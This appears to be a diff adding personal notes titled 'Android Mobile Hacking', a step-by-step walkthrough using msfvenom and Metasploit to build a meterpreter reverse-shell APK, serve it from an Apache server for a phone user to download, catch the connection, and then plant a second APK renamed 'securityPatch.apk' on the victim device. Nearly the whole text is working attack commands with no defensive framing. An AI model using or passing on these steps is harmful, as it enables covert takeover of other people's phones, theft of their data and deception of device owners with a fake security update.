@@ -1,0 +1,21 @@
+Android Mobile Hacking
+======================
+1. msfvenom -l <<< list all exploit
+2. msfvenom -p android/meterpreter/reverse_tcp LHOST=[my host ip] -o /root/Desktop/hackYou.apk
+<<< generate trap apk file
+3. cp /root/Desktop/hackYou.apk /var/www/html/share <<< copy file into directory
+4. service apache2 start (and mobile go download the apk)
+5. msfconsole
+6. set payload android/meterpreter/reverse_tcp
+7. set LHOST=[my host ip]
+8. show options <<< optional (to confirm settings)
+9. exploit -j -z <<< start exploit, listening for incoming request
+
+WHEN USER GET TRAPPED
+---------------------
+1. sessions -i 1 <<< start sessions, 1 is follow by session given
+getuid 
+sysinfo
+ls cd/Downloads/
+upload hackYou2.apk
+mv hackYou2.apk securityPatch.apk
